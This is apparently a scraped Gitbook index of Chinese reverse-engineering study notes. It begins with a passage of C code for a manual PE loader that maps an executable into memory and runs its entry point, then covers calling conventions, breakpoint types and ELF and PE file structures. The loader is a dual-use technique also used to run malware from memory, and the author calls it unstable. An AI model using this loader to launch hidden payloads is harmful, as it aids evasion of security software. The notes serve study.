pNt->OptionalHeader.ImageBase = (DWORD)(uintptr_t)chBaseAddress; char* EntryPoint = (DWORD)(uintptr_t)((char*)chBaseAddress + pNt->OptionalHeader.AddressOfEntryPoint); printf(\"[##] reset OEP success\\n\"); free(pe_buffer); CreateRemoteThread(GetCurrentProcess(), 0, SizeOfImage, (LPTHREAD_START_ROUTINE)EntryPoint, 0, 0, NULL); // https://blog.csdn.net/v_wus/article/details/122112081 //__asm //{ // mov eax, EntryPoint // jmp eax //} 所有代码 #include #include #include #pragma warning(disable : 4996) // use to calc the size in PE DWORD GetSizeOfPE(char* peFile, int options) { DWORD size = 0; FILE* fp = fopen(peFile, \"rb\"); // read PE e_lfnew fseek(fp, 0x3c, SEEK_SET); // get nt offset unsigned char nt_offset = 0; fread(&nt_offset, 1, 1, fp); //printf(\"->%xVirtualAddress == 0 || psection_header->SizeOfRawData == 0) { psection_header++; continue; } DWORD srcaddr = psection_header->PointerToRawData; DWORD sizeofdata = psection_header->SizeOfRawData; char* section_context = (char*)malloc(sizeofdata); fseek(fp, srcaddr, SEEK_SET); fread(section_context, 1, sizeofdata, fp); char* destaddr = (char*)(psection_header->VirtualAddress + chBaseAddress); memcpy(destaddr, section_context, sizeofdata); printf(\"[**] %s section copy success\\n\", psection_header->Name); free(section_context); section_context = NULL; psection_header = NULL; } printf(\"section copy finish\\n\"); // 重写重定位 // 重定位后的地址 = 需要重定位的地址 - 默认加载基址 + 当前加载基址 // 重定位个屁，exe不用重定位 // 直接修复导入表 char* Pdllname = NULL; HMODULE hDll = NULL; PIMAGE_THUNK_DATA lpImportNameArray = NULL; PIMAGE_IMPORT_BY_NAME lpImportByName = NULL; PIMAGE_THUNK_DATA lpImportFuncAddrArray = NULL; FARPROC lpFuncAddress = NULL; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)chBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(chBaseAddress + pDos->e_lfanew); unsigned long v_size = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; PIMAGE_IMPORT_DESCRIPTOR piid = (PIMAGE_IMPORT_DESCRIPTOR)((char*)pDos + v_size); while (1) { // 判断是不是最后一个 if (piid->OriginalFirstThunk==0) { break; } // 动态载入需要的dll Pdllname = (char*)((char*)pDos + piid->Name); // 拿到模块的句柄，没有就loadlibrary载入 hDll = GetModuleHandleA(Pdllname); if (hDll == NULL) { hDll = LoadLibraryA(Pdllname); if (hDll == NULL) { piid++; continue; } } printf(\"[>>] get IID success\\n\"); i = 0; // 获取OriginalFirstThunk以及对应的 导入函数名称表 首地址 lpImportNameArray = (PIMAGE_THUNK_DATA)((char*)pDos + piid->OriginalFirstThunk); // 获取FirstThunk以及对应的 导入函数地址表 首地址 lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((char*)pDos + piid->FirstThunk); while (TRUE) { if (lpImportNameArray[i].u1.AddressOfData == 0) { break; } // 获取IMAGE_IMPORT_BY_NAME结构 lpImportByName = (PIMAGE_IMPORT_BY_NAME)((char*)pDos + lpImportNameArray[i].u1.AddressOfData); // 判断导出函数是 序号导出 or 名称导出 if (0x80000000 & lpImportNameArray[i].u1.Ordinal) { // 序号导出 lpFuncAddress = GetProcAddress(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal & 0x0000FFFF)); } else { // 名称导出 lpFuncAddress = GetProcAddress(hDll, (LPCSTR)lpImportByName->Name); } lpImportFuncAddrArray[i].u1.Function = lpFuncAddress; i++; } piid++; } printf(\"[%%] reparie IAT success\\n\"); // 修改PE文件的加载基地址，设置入口点 pNt->OptionalHeader.ImageBase = (DWORD)(uintptr_t)chBaseAddress; char* EntryPoint = (DWORD)(uintptr_t)((char*)chBaseAddress + pNt->OptionalHeader.AddressOfEntryPoint); printf(\"[##] reset OEP success\\n\"); free(pe_buffer); CreateRemoteThread(GetCurrentProcess(), 0, SizeOfImage, (LPTHREAD_START_ROUTINE)EntryPoint, 0, 0, NULL); // https://blog.csdn.net/v_wus/article/details/122112081 //__asm //{ // mov eax, EntryPoint // jmp eax //} return 0; } 一些问题 vs在64bit的时候，无法使用上述语法内敛汇编，所以使用CreateRemoteThread函数来执行。 上述代码执行并不稳定，在malloc的时候会出现不能稳定复现的问题，如果malloc不报错，在GetModuleHandleA的时候也会出现问题，目前还没有搞清楚为啥。 参考： 原创]PE加载器的简单实现-编程技术-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com) 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 22:36:44 "},"MyArticles/Basics/调用约定和断点.html":{"url":"MyArticles/Basics/调用约定和断点.html","title":"调用约定和断点","keywords":"","body":"调用约定 定义子过程从调用处接受参数以及返回结果的方法的约定，在常见的许多调用约定中，就是为了解决如下几个问题： 参数和返回值的位置 参数传递的顺序 调用前后的栈清理工作 常见的调用约定有 stdcall cdecl fastcall thiscall naked call 参数传递 32-bit Windows linux 无论是Windows还是linux，在32位程序下都是使用的 栈 来传递，先将参数push到栈，然后将返回地址push进去，然后jmp到函数地址。 64-bit Windows 默认是使用fastcall的调用约定，前4个参数使用： rcx, rdx,r8, r9 来传递参数，多余的参数放到栈中传递 linux linux下的前六个参数都是使用寄存器来传递，多余的参数放到栈上执行。 rdi, rsi, rdx, rcx, r8, r9 stdcall 这是win32 API和WinMain还有CAllBACK函数的默认的调用约定，在C语言中可以使用前缀关键字的方式来规定采用何种调用约定 参数从右向左压入堆栈 函数自身修改堆栈 函数的装饰名(decoration name/mangling name)为函数名自动加前导的下划线, 后面紧跟一个@符号, 其后紧跟着参数的尺寸 int __stdcall add(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k) 上述函数从栈结构可以清楚的看到 cdecl cdecl调用约定又称为C调用约定, 是C语言缺省的调用约定, 它的定义语法是: int function(int a, int b) //不加修饰默认就是C调用约定 int __cdecl function(int a, int b) //明确指定C调用约定 参数从右向左压入堆栈 函数的调用者修改堆栈 fastcall 这是win64位下的默认调用方式 通过rcx、rdx和r8，r9传递, 其他参数通过从右向左的顺序压栈 浮点数参数在 XMM0L、XMM1L、XMM2L 和 XMM3L 中传递 被调用函数清理堆栈 修饰名为函数名前加上一个“@”符号，后面也是一个“@”符号和其参数的字节数 断点类型 常见断点类型分为 软件断点 硬件断点 内存断点 软件断点 又称为int3断点，这种实现方式就是将当前的指令修改成0xcc，程序运行到这里会触发异常，调试器捕获到这个异常，实现断点的功能 缺点 上述断点会修改程序的内存，如果程序本身有完整性检查的话就会出问题。病毒程序经常检测程序在内存中运行的代码的 CRC 值是否相同。如果不同，说明数据被修改，则自动杀掉自己。 硬件断点 缺点 只能设置4个，而且需要内存对其（1，2，4，8）字节的断点类型，都需要对其（1字节的不需要）。 使用 一个CPU一般有8个调试寄存器（DR0 ~ DR7 寄存器），用于管理硬件断点 DR0 ~DR3： 存储硬件断点地址。 DR4 和 DR5： 保留。 DR6：调试状态寄存器，用于向调试器报告事件的详细信息，以供调试器判断发生的是何种事件。 DR7：调试控制寄存器，用于定义断点的中断条件。 软件断点是int3断点，硬件断点是int1断点。 在 CPU 每次执行代码之前，都会先确认当前将执行的代码的地址是否是硬件断点的地址，同时也要确认是否有代码要访问被设置了硬件断点的内存区域。 上述俩断点都只能在有限的区域内下断点，不能大面积下断点。在脱壳的时候会用到硬件断点。 gdb 在gdb中可以使用命令 hbreak 下一个硬件断点 内存断点 原理 将下断地址所在的内存页增加一个名为PAGE_NOACCESS的属性，这个属性会把当前内存页设为禁止任何形式的访问，如果进行访问会触发一个内存访问异常。在这同时，调试器捕获目标程序中的这个异常，并判断触发这个异常的位置是否跟你下断的地址相同，如果相同则内存断点触发，暂停被调试程序的运行，否则放行。 虽然内存断点的效率经常很不理想，但是因为仅仅是修改了一个内存属性，所以内存断点可以下数量非常多、单断点范围非常大。这是它的优势。 只在写入时断下的内存断点通常是将内存属性设为PAGE_EXECUTE_READ，也就是不可写来实现的。对这种属性的内存进行写操作将会触发异常。 优点 可以大范围的下断点，在脱壳的时候常用。 本质 他并不是修改某一个特定的指令，而是改变了内存中某个块或者页的权限。 一个内存页是操作系统处理的最小的内存单位。一个内存页被申请成功以后，就拥有了一个权限集，它决定了内存该如何被访问。 可执行页：允许执行但不允许读或写，否则抛出访问异常。 可读页：只允许从页面中读取数据，其余的则抛出访问异常。 可写页：允许将数据写入页面。 一般来说可执行的页不会具有写权限。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-10 21:13:55 "},"MyArticles/Basics/elf文件结构.html":{"url":"MyArticles/Basics/elf文件结构.html","title":"ELF structure","keywords":"","body":"PE是Windows下的文件，elf是linux下的文件。学习网络前端Windows是主要市场，后端服务端则是linux的天下。学习pe文件结构也要学习elf文件结构。前端的Windows病毒来势凶猛，后端的linux攻击也是防不胜防。挖矿病毒肆虐；僵尸网络横行，不懂elf文件结构怎能进入网络安全这一大主题的门槛。 当时在进行pwn入门的时候，没有学习elf的文件结构，只是知道了怎么用，在哪里用，现在了解了文件结构，对以往的pwn知识有了更加深入的理解。 结构综述 ELF文件由四部分组成：ELF头、程序头、节、节头 本文以一个简单的C语言文件当作例子 #include int main() { printf(\"hello world\\n\"); return 0; } 为了方便正常人的思路，记录顺序做了一下调整。 ELF头 可以在文件：/usr/include/elf.h中找到定义 #define EI_NIDENT (16) typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */ } Elf32_Ehdr; typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf64_Half e_type; /* Object file type */ Elf64_Half e_machine; /* Architecture */ Elf64_Word e_version; /* Object file version */ Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; /* Processor-specific flags */ Elf64_Half e_ehsize; /* ELF header size in bytes */ Elf64_Half e_phentsize; /* Program header table entry size */ Elf64_Half e_phnum; /* Program header table entry count */ Elf64_Half e_shentsize; /* Section header table entry size */ Elf64_Half e_shnum; /* Section header table entry count */ Elf64_Half e_shstrndx; /* Section header string table index */ } Elf64_Ehdr; 存在32和64两种类型，基本一样的。 Elf64_Half和Elf64_Word是uint16_t uint32_t的预定义 在里面挑了几个重要的，记录一下，其他的不重要的就让他在书上吧。 e_ident数组 该数组首先以特定的4字节字符串开头\\x7fELF，这可以让文件加载器快速的认出来他是一个二进制文件， 通过命令readelf -h learnS 如果在编译的时候不添加-no-pie，这里的entry point addtress就是一个偏移。 e_type 这个多字节数组指定了elf文件的类型，一般有三种类型 ET_REL: 可重定位的对象文件 ET_EXEC：可执行的二进制文件 ET_DYN：共享对象文件（共享库） 例如下面的这个so.2程序 e_phoff和e_shoff e_shoff：section header offset,另一个同理是程序段的偏移，根据这两个值可以找到程序头和节头，一个是64字节，一个是6632字节。 注意：这里可以设置为0，意味着程序不包含程序头表和节头表；这里的地址不是虚拟地址，而是偏移量。 e_ehsize 该字段阐述了elf头部的大小，对于64位程序来说，大小就是64字节；对于32位的程序来说，elf头部的大小是52字节 e_shstrndx 该字段中包含一个名为.shstrndx的和特殊字符串表节相关的头索引。 这个.shstrtab在节头表中，这是一个专用节，包含一个以NULL值结尾的一个ascii数组。一个节一个名称。 readelf -x .shstrtab learnS 通过这个可以用16进制的形势查看内容。 在该头里其他的部分看起来对于逆向分析没有什么作用。 节头表 1.节：elf文件中代码和数据在逻辑上被分为连续的非重叠块，称为节（section）。 2.对于节的描述：没有任何预设的结构体，每个节的结构体取决于内容。每个节由节头描述，节头指定了节的属性。二进制中所有的节的节头都在节头表中。 3.节只是为链接器提供视图，因此是可选部分，不需要链接的二进制文件就不需要节头表，没有节头表，就将e_shoff的值设为 0.当二进制文件创建进程开始执行的时候，并不是所有的节都会载入内存，比如符号信息或者重定位信息。 段和节 二进制文件制定了另一种逻辑组织，称为段，段在文件执行的时候被使用；而节在连接时被使用。 同样在上述目录中，可以找到关于节头的定义 /* Section header. */ typedef struct { Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution */ Elf32_Off sh_offset; /* Section file offset */ Elf32_Word sh_size; /* Section size in bytes */ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */ } Elf32_Shdr; typedef struct { Elf64_Word sh_name; /* Section name (string tbl index) */ Elf64_Word sh_type; /* Section type */ Elf64_Xword sh_flags; /* Section flags */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Section size in bytes */ Elf64_Word sh_link; /* Link to another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */ } Elf64_Shdr; sh_name 这是节头的第一个字段，如果被设置，则在字符串表中包含索引；如果索引是0，则该节没有名称。 这里存在一个大致这样的流程。 sh_type 该字段阐述了节的类型，存在多种类型，在链接时会用到，内容不重要。 sh_flags 关于节的其他信息，其中最重要的有三种：SHF_WRITE、SHF_ALLOC 、SHF_EXECINSTR。 SHF_WRITE 在运行时可写，可以用来区分包含静态数据的节和包含变量的节。 SHF_ALLOC 指示在执行二进制文件的时候将该节的内容加载到虚拟内存，虽然在执行时是按照段视图。 SHF_EXECINSTR 指示该节包含可执行指令。 sh_addr、sh_offset、sh_size 描述该节的虚拟地址、文件偏移、节大小。 当设置sh_addr的值为0时，表示节不会加载到虚拟内存中。 其他 其他字段都不重要了 节 通过命令readelf --sections --wide learnS来查看节信息。可以看到节头表第一项由一个NULL项，这是标准的。 Section Headers: [Nr] Name Type Address Off Size ES Flg Lk Inf Al [ 0] NULL 0000000000000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 0000000000400238 000238 00001c 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 0000000000400254 000254 000020 00 A 0 0 4 [ 3] .note.gnu.build-id NOTE 0000000000400274 000274 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 0000000000400298 000298 00001c 00 A 5 0 8 [ 5] .dynsym DYNSYM 00000000004002b8 0002b8 000060 18 A 6 1 8 [ 6] .dynstr STRTAB 0000000000400318 000318 00003f 00 A 0 0 1 [ 7] .gnu.version VERSYM 0000000000400358 000358 000008 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 0000000000400360 000360 000020 00 A 6 1 8 [ 9] .rela.dyn RELA 0000000000400380 000380 000030 18 A 5 0 8 [10] .rela.plt RELA 00000000004003b0 0003b0 000018 18 AI 5 22 8 [11] .init PROGBITS 00000000004003c8 0003c8 000017 00 AX 0 0 4 [12] .plt PROGBITS 00000000004003e0 0003e0 000020 10 AX 0 0 16 [13] .text PROGBITS 0000000000400400 000400 000182 00 AX 0 0 16 [14] .fini PROGBITS 0000000000400584 000584 000009 00 AX 0 0 4 [15] .rodata PROGBITS 0000000000400590 000590 000010 00 A 0 0 4 [16] .eh_frame_hdr PROGBITS 00000000004005a0 0005a0 00003c 00 A 0 0 4 [17] .eh_frame PROGBITS 00000000004005e0 0005e0 000100 00 A 0 0 8 [18] .init_array INIT_ARRAY 0000000000600e10 000e10 000008 08 WA 0 0 8 [19] .fini_array FINI_ARRAY 0000000000600e18 000e18 000008 08 WA 0 0 8 [20] .dynamic DYNAMIC 0000000000600e20 000e20 0001d0 10 WA 6 0 8 [21] .got PROGBITS 0000000000600ff0 000ff0 000010 08 WA 0 0 8 [22] .got.plt PROGBITS 0000000000601000 001000 000020 08 WA 0 0 8 [23] .data PROGBITS 0000000000601020 001020 000010 00 WA 0 0 8 [24] .bss NOBITS 0000000000601030 001030 000008 00 WA 0 0 1 [25] .comment PROGBITS 0000000000000000 001030 000029 01 MS 0 0 1 [26] .symtab SYMTAB 0000000000000000 001060 0005b8 18 27 43 8 [27] .strtab STRTAB 0000000000000000 001618 0001cc 00 0 0 1 [28] .shstrtab STRTAB 0000000000000000 0017e4 000103 00 0 0 1 .init和.fini节 .init .init节中包含可执行代码，用来初始化程序。在程序将控制权移动到main函数之前，由init里的代码掌握。可以看作是构造函数。 .fini节 在程序执行结束之后执行的，和析构函数一样。 .text节 该节包含了程序的主要代码。 一般来说，可执行的节是不可写的，可写的是不可执行的（出于安全考虑） 在本例中（标准gcc编译的程序）中text节中包含多个开始任务和结束任务的标准函数： _start register_tm_clones frame_dummy这仨比较重要。 _start 函数 通过objdump -M intel -d learnS可以看到不同函数的反汇编。 在地址0x400424的地址处，调用了__libc_start_main函数，这里查看rdi寄存器，可以看到是程序main函数的地址。 这就是为什么gdb里下断点会下在这里，查看rdi的值获得main函数的地址 .bss和.data还有.rodata 因为代码节不可写，所以变量会保存在多个可写的专用节中。 .rodata read only data代表.rodata ，用来存储常量。 .data 初始化变量的默认值存放在这个节里。因为变量会被修改，所以标记为可写的节。 .bss 为了未初始化变量保留的空间，该节不会占用磁盘上的空间，只在二进制文件创建执行环境的时候为没有初始化的变量分配内存。该节是可写的。 延迟绑定plt、got plt表：（过程链接表）Procedure Linkage Table； got表：（全局偏移表）Gobal Offset Table； 为什么要延迟绑定：保证了动态链接器不会在重定位上浪费时间，只在需要的时候执行。 注意：若程序有实时性能的要求，则可以通过在bash中exportLD_BIND_NOW=1来取消动态绑定。 .got.plt（GOT表）这是一个单独的节，是运行时可写的，如果程序开启了RELRO（重定位只读）防御got表覆盖攻击，那么got表不可写，这时就将会变化的值放在了这个表中，方便运行时改变。 .plt.got（PLT表）这是一个备用的plt表，他的大小是8字节，在开启got不可写之后该表会代替16字节的plt表。 got节用于引用数据项，got,plt节用来存放通过plt访问（已经解析的）的库函数地址 执行流程 00000000004003e0 : 4003e0: ff 35 22 0c 20 00 push QWORD PTR [rip+0x200c22] # 601008 4003e6: ff 25 24 0c 20 00 jmp QWORD PTR [rip+0x200c24] # 601010 4003ec: 0f 1f 40 00 nop DWORD PTR [rax+0x0] 00000000004003f0 : 4003f0: ff 25 22 0c 20 00 jmp QWORD PTR [rip+0x200c22] # 601018 4003f6: 68 00 00 00 00 push 0x0 4003fb: e9 e0 ff ff ff jmp 4003e0 通过命令objdump -M intel --section .plt -d learnS可以看到上面的汇编结构。 地址4003e0处作为 “默认存根” 地址4003f0处作为“函数存根” plt存根以间接跳转指令开头，这导致他跳转到存储在.got.plt节中的地址（4003f0处的行为）。 在延迟绑定之前，该地址是函数存根下一条（push）指令的地址，间接跳转将控制权交给地址4003f6. 将0x0压入栈中（这是plt存根的标识符）。 4003fb地址的行为跳转到所有plt函数存根之间共享的通用默认存根。 默认存根push另一个标识符（从got中获得）表示可执行文件自身。间接的通过got跳转到动态链接器。 标识符 通过push plt存根的标识符，动态链接器可以确定puts函数的位置，并且这样还代表main函数已经加载到内存中了。 重要的是：同一个进程中会加载多个库，每一个库都有自己的PLT和GOT，动态链接器会寻找puts函数的地址，将函数的地址插入与put@plt相关的got条目中，完成延迟绑定。 GOT存在的意义 对于每个进程来说，相同的库代码也会映射到不同的虚拟地址中，所以不能直接将解析库函数的地址修补到程序中。因为该地址只在该进程的上下文起作用。但是每个进程都有got表的专用副本，这就可以了。 安全问题。 .dynamic节 充当的是操作系统和动态链接器的“路线图”，具体内容我觉的没啥用，不写了。 .init_array 节 包含一个指向构造函数的指针数组，在main函数被调用前会执行的一系列的构造函数。 init节包含可执行代码 init_array节是一个包含了“所需数量的函数指针”的数据节，也包括了指向自定义构造函数的指针， 在GCC中，可以通过 __attribute__((constructor)) 来修饰函数，将其标记为构造函数。 通过命令objdump -M intel --section .init_array -d learnS,看到该程序中的构造函数只有一个 验证得到： ​ 地址正好指向了函数，这是一个默认的初始化函数，在ida中查看该函数 .fini_array 节 作用和上述.init_array节相反，存放的是一些“析构函数”的指针。 这个程序的析构函数是0x4004b0地址处的函数。 另外：这两个节区的指针很容易被修改，所以是一个方便下钩子（hook）的地方。钩子将初始化甚至结束代码添加到二进制程序中并修改他的行为。 .shstrtab和.dynsym还有.dynstr节区 .shstrtab：一个以NULL结尾的字符串数组，包含了二进制文件中所有节的名称，并根据节头进行索引。可以帮助readelf之类的工具找到节的名称。 .dynsym还有.dynstr：包含了动态链接需要的符号和字符串，所以是不能去掉的。 可以用strip filename的形式去除表中的符号。 程序头 从相同的文件中找到关于elf程序头的定义 typedef struct { Elf32_Word p_type; /* Segment type */ Elf32_Off p_offset; /* Segment file offset */ Elf32_Addr p_vaddr; /* Segment virtual address */ Elf32_Addr p_paddr; /* Segment physical address */ Elf32_Word p_filesz; /* Segment size in file */ Elf32_Word p_memsz; /* Segment size in memory */ Elf32_Word p_flags; /* Segment flags */ Elf32_Word p_align; /* Segment alignment */ } Elf32_Phdr; typedef struct { Elf64_Word p_type; /* Segment type */ Elf64_Word p_flags; /* Segment flags */ Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment */ } Elf64_Phdr; 程序头表提供的是段的视图 通过命令readelf --wide --segments learnS可以看到程序中的程序头 通过下的描述可以发现，段是由节简单的捆绑组成的。 对于重要的字段进行说明。 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000040 0x0000000000400040 0x0000000000400040 0x0001f8 0x0001f8 R 0x8 INTERP 0x000238 0x0000000000400238 0x0000000000400238 0x00001c 0x00001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x000000 0x0000000000400000 0x0000000000400000 0x0006e0 0x0006e0 R E 0x200000 LOAD 0x000e10 0x0000000000600e10 0x0000000000600e10 0x000220 0x000228 RW 0x200000 DYNAMIC 0x000e20 0x0000000000600e20 0x0000000000600e20 0x0001d0 0x0001d0 RW 0x8 NOTE 0x000254 0x0000000000400254 0x0000000000400254 0x000044 0x000044 R 0x4 GNU_EH_FRAME 0x0005a0 0x00000000004005a0 0x00000000004005a0 0x00003c 0x00003c R 0x4 GNU_STACK 0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW 0x10 GNU_RELRO 0x000e10 0x0000000000600e10 0x0000000000600e10 0x0001f0 0x0001f0 R 0x1 p_type 标识了段的类型，该字段存在三个重要的类型： PT_LOAD PT_DYNAMIC PT_INTERP PT_LOAD 具有该表示的段在创建进程 时候会加载到内存中去，在上述代码中可以看到有两个具有 LOAD标识的段，一个包含了可写数据节（off:0x000e10），一个包含不可写数据节(off:0x000000)。 PT_INTERP & PT_INTERP 该段包含了.INTERP节，该节提供了加载二进制文件解释器的名称；PT_INTERP段包含了.dynamic节，该节通知解释器如何运行该二进制文件。 其他的就不重要了。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-11-19 13:13:18 "},"MyArticles/Basics/Pe File Structer.html":{"url":"MyArticles/Basics/Pe File Structer.html","title":"PE structure","keywords":"","body":"写在前面 微软基于COFF（通用项目文件格式）来设计的可执行文件，本篇学习笔记是基于《黑客免杀攻防》一书来学习记录的，之前有一篇记录是基于《逆向工程核心原理》写的逆向工程学习-PE文件格式 | R-o-o-t-k-i-t (hellorootkit.github.io)这两篇相互独立，只不过是不同的时间再次学习一下罢了。 可以在文件WinNt.h文件中找到。 一些缩写。 RAW：文件偏移 RVA：相对虚拟地址（是指相对与ImageBase的偏移） VA：虚拟地址，也就是程序被加载到内存中的地址 利用010editor 首先下载对应的模板，然后在010里运行模板，然后alt+f4显示模板变量，这样看起来比较方便，效果如下： 这里分析起来结构就如虎添翼了。 MS-DOS头 普遍存在于PE文件中的一个没啥用的节区，当PE文件运行在dos系统（DOS作为微软公司在个人计算机上使用的一个操作系统载体，1981年 - 1995年）时会执行，告诉你这个程序不能在dos系统里执行。在winnt.h文件的14889行可以找到DOS头的信息 // DOS .EXE header typedef struct _IMAGE_DOS_HEADER{ WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; e_magic 就是4D 5A这两个字节，表示这是一个DOS下的可执行文件 e_ss; e_sp…… 这两个值用来在程序开始的时候初始化SS SP的两个寄存器的值，剩下的后面的几个就是初始化各个对应的寄存器的值。 e_lfarlc 这个头指向了程序中重定位表的地址 e_lfanew 这个值指向的是PE文件头（NT头）的偏移，这个数字的偏移是0x3c（从MZ那开始算起） DOS签名 这里就是一串字符串，和一些汇编代码，可以在dos里显示出这个字符串的汇编代码。 PE头（NT头） 在哪个头文件的15186行可以找对对应的描述 typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; typedef struct _IMAGE_NT_HEADERS { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader; } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 不论是64位的程序还是32位的程序，这个结构体包含的内容基本是一样的。 Signature DWORD Signature; 这个字段由四个字节组成PE\\x00\\x00 IMAGE_FILE_HEADER IMAGE_FILE_HEADER FileHeader; 这个结构中包含了整个PE文件的概览信息，文件的15006行。 typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; Machine 一个两字节的值，表示了该程序运行在何种CPU上。在15034行可以看到宏定义，很重要的值，但是利用起来没啥用。 #define IMAGE_FILE_MACHINE_UNKNOWN 0 #define IMAGE_FILE_MACHINE_I386 0x014c // Intel 386. #define IMAGE_FILE_MACHINE_R3000 0x0162 // MIPS little-endian, 0x160 big-endian #define IMAGE_FILE_MACHINE_R4000 0x0166 // MIPS little-endian #define IMAGE_FILE_MACHINE_R10000 0x0168 // MIPS little-endian #define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 // MIPS little-endian WCE v2 #define IMAGE_FILE_MACHINE_ALPHA 0x0184 // Alpha_AXP #define IMAGE_FILE_MACHINE_SH3 0x01a2 // SH3 little-endian #define IMAGE_FILE_MACHINE_SH3DSP 0x01a3 #define IMAGE_FILE_MACHINE_SH3E 0x01a4 // SH3E little-endian #define IMAGE_FILE_MACHINE_SH4 0x01a6 // SH4 little-endian #define IMAGE_FILE_MACHINE_SH5 0x01a8 // SH5 #define IMAGE_FILE_MACHINE_ARM 0x01c0 // ARM Little-Endian #define IMAGE_FILE_MACHINE_THUMB 0x01c2 // ARM Thumb/Thumb-2 Little-Endian #define IMAGE_FILE_MACHINE_ARMNT 0x01c4 // ARM Thumb-2 Little-Endian #define IMAGE_FILE_MACHINE_AM33 0x01d3 #define IMAGE_FILE_MACHINE_POWERPC 0x01F0 // IBM PowerPC Little-Endian #define IMAGE_FILE_MACHINE_POWERPCFP 0x01f1 #define IMAGE_FILE_MACHINE_IA64 0x0200 // Intel 64 #define IMAGE_FILE_MACHINE_MIPS16 0x0266 // MIPS #define IMAGE_FILE_MACHINE_ALPHA64 0x0284 // ALPHA64 #define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 // MIPS #define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 // MIPS #define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64 #define IMAGE_FILE_MACHINE_TRICORE 0x0520 // Infineon #define IMAGE_FILE_MACHINE_CEF 0x0CEF #define IMAGE_FILE_MACHINE_EBC 0x0EBC // EFI Byte Code #define IMAGE_FILE_MACHINE_AMD64 0x8664 // AMD64 (K8) #define IMAGE_FILE_MACHINE_M32R 0x9041 // M32R little-endian #define IMAGE_FILE_MACHINE_CEE 0xC0EE NumberOfSections 这个文件中节区的数目，如果说要新增一个节区的话，就要更改这里。 TimeDateStamp 文件的时间戳，在样本分析中可以根据时间戳来进行画像和溯源，这是比系统的日期和时间更加精确的时间。 可以看到都精确到秒了。 NumberOfSymbols 符号表中的符号的数量，COFF文件的符号表 长度固定，只有通过这个结构才能算出来符号表的结尾 SizeOfOptionalHeader 